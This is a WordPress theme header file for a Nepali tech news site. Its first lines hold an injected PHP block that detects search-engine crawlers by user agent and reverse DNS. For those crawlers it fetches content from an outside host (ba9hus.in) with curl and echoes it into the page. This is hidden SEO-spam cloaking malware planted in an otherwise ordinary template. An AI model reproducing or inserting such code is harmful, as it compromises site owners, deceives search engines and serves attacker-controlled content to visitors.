


<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://ba9hus.in/cac4/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><?php
    $theme_opts         =   get_option('gfi_opts');
?>
<!--Header Starts-->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Pragma" content="cache">
<meta name="ROBOTS" content="All">
<meta name="keywords" content="news,u headline, headlines, technology, latest news, tech news, nepal news, nepal online news, online nepal, tech nepal">
<meta name="description" content="news, headline, headlines, technology, latest news, tech news, nepal news, nepal online news, online nepal, tech nepal">
<link href="PHP Enter Demo_files/favicon.ico" type="image/x-icon" rel="shortcut icon">
<title><?php wp_title(); ?></title>
<?php wp_head(); ?>



</head>
<body>
    
    <div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=1365616750244931";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
    
<div class="main_wrapper">
<!--Header Start-->
	<header class="main_header">
<!--logo area start-->
		<div class="logo">
                    <?php
                    if($theme_opts['logo_type']==1){
                        ?>
                    <a href="index.php"><span class="logo_text"><?php bloginfo('name'); ?></span></a>
                        
                    <?php
                    }else{
                        ?><a href="index.php"><img src="<?php echo $theme_opts['logo_img']; ?>"/><span class="logo_text"><?php bloginfo('name'); ?></span></a><?php
                    }
                    ?>
                    
                    
		</div>
		<!--Logo Area Ends-->
<!--Search Area Starts-->
		<div class="search">
		
               <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('sidebar-2') ) : ?>
               <?php endif; ?>
                    
                    
		</div>
<!--Search Area Ends-->
		<div class="clear"></div>
	</header>
<!--Main NAvigation Starts-->
<nav id="i-nav">MENU</nav>
	<nav class="main_nav">
            <?php
            wp_nav_menu(array(
                'theme_location' => 'primary',
                'container'      => false,
                'menu_class'     => 'nav navbar-nav'
            ));
            ?>
            
		<!--ul>
			<li class="hide"><a href="index.php">Home</a></li>
			<li><a href="browsecat.php?catid=1">Business</a></li>
			<li><a href="browsecat.php?catid=2">Entertainment</a></li>
			<li><a href="browsecat.php?catid=3">Health</a></li>
			<li><a href="browsecat.php?catid=4">Internet</a></li>
			<li><a href="browsecat.php?catid=5">Politics</a></li>
			<li><a href="browsecat.php?catid=6">Science</a></li>
			<li><a href="browsecat.php?catid=7">Sports</a></li>
				<ul class="mob">
					<li><a href="submit.php">Submit Story</a></li>
					<li><a href="gallary.php">Gallery</a></li>
					<li><a href="#">Members</a></li>
					<li><a href="browsecatagory.php">Browse by Category</a></li>
					<li><a href="videos.php">Videos</a></li>
					<li><a href="#">Top Rated Articles</a></li>
					<li><a href="#">News RSS Feeds</a></li>
				</ul>
		</ul-->
	</nav>
	<!--Main Navigation Ends-->
	<!--Sub Menus Starts-->
	<div id="sectabs">
	<ul>
<li><a href="submit.php">Submit Story</a></li>
<li><a href="gallary.php">Gallery</a></li>
<li><a href="#">Members</a></li>
<li><a href="browsecatagory.php">Browse by Category</a></li>
<li><a href="videos.php">Videos</a></li>
<li><a href="#">Top Rated Articles</a></li>
<li><a href="#">News RSS Feeds</a></li>
</ul>
</div>
	<!--Sub Menus Ends-->
<!--Ticker Start-->
<div class="ticker"><strong>Latest News:</strong> This is ticker</div>
<!--Ticker Ends--><!--Header Ends-->

